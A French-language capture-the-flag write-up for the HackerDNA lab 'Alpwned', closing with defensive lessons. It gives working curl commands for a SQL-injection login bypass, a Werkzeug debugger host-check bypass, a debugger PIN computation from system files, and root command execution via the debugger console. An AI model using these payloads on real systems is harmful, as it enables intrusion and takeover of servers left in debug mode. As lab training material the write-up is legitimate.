# Compte rendu : Alpwned

Plateforme : HackerDNA (https://hackerdna.com/labs/alpwned)
Auteur : SRH
Catégorie : Sécurité Web & API
Difficulté : Moyenne
Tags : SQL Injection, Authentication Bypass, SSH, Linux Privilege Escalation, Werkzeug Debugger, Alpine Linux
XP : +400 XP

## Scénario
Ce système Alpine Linux semble bien sécurisé avec plusieurs couches défensives protégeant deux flags précieux. Une application web garde l'entrée, tandis que des protections système plus profondes attendent ceux qui parviennent à franchir les premières barrières. L'objectif est de trouver le chemin à travers les mesures de sécurité et récupérer les deux trésors.

Prérequis : connaissances de base en SQL, fondamentaux des applications web, bases de la ligne de commande Linux, compréhension des mécanismes d'authentification.

## Chaîne d'Attaque
[Reconnaissance] → [Injection SQL] → [Dashboard admin] → [Vol d'identifiants SSH] → [Flag user] → [Debugger Werkzeug] → [Calcul du PIN] → [RCE root] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle deux ports ouverts : le port 22 (OpenSSH) et le port 80 (Werkzeug httpd 3.1.3, Python 3.12.11). L'application web est un portail employé avec une page de login mentionnant des identifiants invités (guest:guest).

nmap -sV <IP>

## Étape 2 — Injection SQL
Le formulaire de login est vulnérable à une injection SQL. La requête est construite avec des f-strings, et bien que --, /* et union soient bloqués, une simple tautologie fonctionne.

curl -s -i -X POST http://<IP>/login \
  --data-urlencode "username=admin' OR '1'='1" \
  --data-urlencode "password=x"

Résultat attendu : redirection 302 vers /dashboard avec un cookie de session contenant role: admin.

## Étape 3 — Vol d'identifiants SSH sur le dashboard
Le dashboard admin affiche une table de credentials internes, dont un accès SSH actif pour l'utilisateur ctf.

curl -s -b cookies.txt http://<IP>/dashboard

Identifiants SSH récupérés : ctf:<PASSWORD_SSH>.

## Étape 4 — Flag utilisateur
On se connecte en SSH avec les identifiants trouvés, puis on lit le flag utilisateur.

ssh ctf@<IP>
cat /home/flag-user.txt

Flag User : <USER_FLAG>

Le serveur tourne sous Alpine Linux (d'où le nom "Alpwned").

## Étape 5 — Debugger Werkzeug
Le serveur Flask tourne avec debug=True, ce qui active le debugger interactif Werkzeug. Celui-ci est protégé par un PIN et une vérification d'hôte.

### Bypass de la vérification d'hôte
Le debugger n'accepte que les requêtes avec Host: localhost. On contourne avec l'en-tête approprié :

curl -H "Host: localhost" http://<IP>/console

### Calcul du PIN
Le PIN est généré à partir de valeurs publiques (username root, module flask.app, app Flask, chemin de app.py) et privées (adresse MAC, machine ID). On récupère ces valeurs depuis le shell SSH (utilisateur ctf) :

cat /proc/sys/kernel/random/boot_id
cat /proc/self/cgroup | head -1
python3 -c "import uuid; print(uuid.getnode())"

Le PIN est ensuite calculé avec le script standard Werkzeug. Dans le writeup de référence, le PIN obtenu est de la forme 258-593-142.

## Étape 6 — Authentification et RCE root
On extrait le SECRET depuis la page /console, puis on s'authentifie avec le PIN calculé :

curl -H "Host: localhost" \
  "http://<IP>/console?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>"

Résultat attendu : {"auth": true, ...} et un cookie __wzd....

Puis on exécute des commandes en root via le debugger :

curl -G "http://<IP>/console" \
  -H "Host: localhost" \
  -b "<COOKIE_WZD>" \
  --data-urlencode "__debugger__=yes" \
  --data-urlencode "cmd=__import__('os').popen('cat /root/flag-root.txt').read()" \
  --data-urlencode "frm=0" \
  --data-urlencode "s=<SECRET>"

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation multi-étapes : une injection SQL dans le formulaire de login permet de contourner l'authentification et d'accéder au dashboard admin, qui expose des identifiants SSH. Une fois sur le système, le debugger Werkzeug activé en production (mode debug=True) permet de calculer le PIN et d'obtenir une exécution de code en root.

## Leçons Apprises
1. Ne jamais construire de requêtes SQL par concaténation de chaînes : utiliser des requêtes préparées.
2. Ne jamais exposer d'identifiants SSH en clair dans une interface d'administration.
3. Désactiver le mode debug=True de Flask en production : le debugger Werkzeug est un vecteur de RCE.
4. Le PIN du debugger Werkzeug est calculable à partir de fichiers accessibles à l'utilisateur (boot_id, cgroup, MAC).
5. La vérification d'hôte du debugger (Host: localhost) est trivialement contournable avec un en-tête HTTP.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
